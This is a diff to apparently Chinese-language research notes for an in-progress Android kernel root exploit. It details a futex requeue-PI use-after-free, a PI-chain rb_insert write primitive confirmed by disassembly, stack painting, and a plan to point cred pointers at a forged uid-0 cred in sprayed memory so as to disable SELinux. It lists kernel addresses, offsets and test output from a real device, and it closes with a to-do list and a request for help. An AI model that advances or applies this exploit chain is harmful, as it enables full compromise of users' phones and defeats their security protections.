@@ -18,9 +18,10 @@
     ↓ waiter->lock = &pselect_user_lock (用户空间, PAN 不阻止)
 [5] consumer sched_setattr 触发 rt_mutex_adjust_prio_chain
     ↓ PI 链: waiter→lock→owner(fake_task)→fake_w0.pi_tree
-[6] rb_insert 写入 *(target) = value (任意地址写入)
-    ↓ write_left = target-8, write_pc = value
-[7] 写 task->cred = init_cred + selinux_enforcing = 0 → root
+[6] rb_insert 写入 *(target) = &栈waiter.pi_tree_entry (栈地址, 非可控值!)
+    ↓ 只能写栈地址, 不能直接写 0/init_cred
+[7] 让 pi_blocked_on 指向 spray 页面的 fake_w0 + 伪造 cred → 写指针槽 = &fake_w0.pi_tree_entry
+    ↓ task->cred/real_cred 指向伪造 cred (uid=0) → root
 ```
 
 ## 真机测试进度 (2026-07-18)
@@ -44,17 +45,34 @@
 pselect returned attempt=1 ret=0 errno=0 calls=40 success=40 delay=50000
 ```
 
-## 当前卡点
+## 当前卡点 (2026-07-18 已确认)
 
-### 1. PI 链写入值不是 write_pc (最关键)
+### 1. PI 链写入值是栈地址, 不是 write_pc (已确认, 最关键)
 
-PI 链触发成功 (consumer 40 次 sched_setattr), 但写入没生效 (selinux 没变)。
+**反汇编 chain_disasm.txt 确认**: `rt_mutex_adjust_prio_chain` 的 rb_insert (行193) 写的是 `str x25, [x11, x13]`,
+其中 x25 = `task->pi_blocked_on` 指向的 waiter 的 pi_tree_entry 地址 (栈地址)。
 
-原因: rb_insert 写入的值可能是**栈上 waiter 的 pi_tree_entry 地址** (栈地址, 非0), 不是 write_pc。
+**真机验证** (STAGE=7, 栈 painting val=0):
+```
+CMP_REQUEUE_PI ret=1       ← UAF 触发
+waiter WAIT_REQUEUE_PI ret=0 ← UAF 确认
+stack-painted val=0 tgt=SELINUX_ENFORCING-8  ← 栈 painting 正确
+pselect returned calls=40 success=40  ← PI 链触发
+enforce AFTER=1 (仍 Enforcing)  ← 写入失败 (栈地址非0)
+```
 
-测试: `set_pselect_write(SELINUX_ENFORCING-8, 0, 0)` 期望 `*selinux_enforcing=0`, 但 selinux 仍 Enforcing。
+**结论**: PI 链写入原语**只能写栈地址**, 无法写 0 或 init_cred。这正是 dijun "两次 walk + 伪造 cred" 的原因。
 
-需要: 反汇编 `rt_mutex_adjust_prio_chain` (0xffffffc081052868) 的 rb_insert 部分, 确认实际写入值。
+### dijun 路线的真正含义
+
+```
+walk#1: *(task->real_cred) = &fake_w0.pi_tree_entry (spray 页面已知地址)
+walk#2: *(task->cred)      = &fake_w0.pi_tree_entry
+        其中 fake_w0 页面伪造了 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
+```
+
+要让写入可控: 让 `task->pi_blocked_on` 指向 **spray 页面的 fake_w0** (而非栈 waiter),
+这样 x25 = &fake_w0.pi_tree_entry (已知地址), 且 fake_w0 页面可伪造 cred。
 
 ### 2. mm_struct → task_struct (读 mm->owner)
 
@@ -139,27 +157,33 @@ owner=+0x408 (MM_OWNER_OFF)
 +0x58 lock (ptr) ← 关键字段
 ```
 
-### 写入原语
+### 写入原语 (已确认)
 ```
 set_pselect_write(target-8, value, 0)
 → fake_w0.pi_tree.rb_left = target-8
 → fake_w0.pi_tree.__rb_parent_color = value
-→ PI 链 rb_insert: *(target) = ??? (待确认是 value 还是栈地址)
+→ PI 链 rb_insert: *(target) = &栈waiter.pi_tree_entry (栈地址, 非 value!)
 ```
+
+要让写入可控: 让 task->pi_blocked_on 指向 spray 页面的 fake_w0 (而非栈 waiter),
+则 rb_insert 写 &fake_w0.pi_tree_entry (已知地址), 且 fake_w0 页面可伪造 cred。
 
 ### 反汇编关键函数
 ```
 ashmem_open            = 0xffffffc080c7af5c (struct ashmem_area=0xdc0, name@+0x0)
 configfs_bin_read_iter = 0xffffffc080488c9c
 configfs_read_iter     = 0xffffffc080488978
-rt_mutex_adjust_prio_chain = 0xffffffc081052868
+rt_mutex_adjust_prio_chain = 0xffffffc081052868 (rb_insert 行193: str x25,[x11,x13])
 rt_mutex_cleanup_proxy_lock = 0xffffffc081052634
 ```
 
 ## 待办 (需要做的工作)
 
-### 优先级 1: 确认 PI 链写入值
-反汇编 rt_mutex_adjust_prio_chain 的 rb_insert 部分, 确认写入值是 write_pc 还是栈地址。这决定了能否写任意值。
+### 优先级 1: 让写入原语可控 (pi_blocked_on → fake_w0)
+当前 rb_insert 写栈地址。需让 `task->pi_blocked_on` 指向 spray 页面的 fake_w0:
+- 栈 painting 覆盖栈 waiter 的 pi_blocked_on 字段 (+0x50) 指向 fake_w0
+- 在 fake_w0 页面伪造 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
+- 两次 walk 写 real_cred/cred 指针槽 = &fake_w0.pi_tree_entry
 
 ### 优先级 2: 解决 mm->owner 读取
 找到不依赖 configfs/ashmem 的内核读方法, 读 mm_struct+0x408 拿 task_struct。候选: /dev/uhid、perf_event、eBPF。
@@ -230,7 +254,7 @@ clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
 
 ## 联系
 
-有研究兴趣或思路的欢迎讨论。核心求助点: **PI 链 rb_insert 写入值确认 + mm->owner 内核读取**。
+有研究兴趣或思路的欢迎讨论。核心求助点: **让 PI 链写入原语可控 (pi_blocked_on→fake_w0 + 伪造 cred) + mm->owner 内核读取**。
 
 ---
 
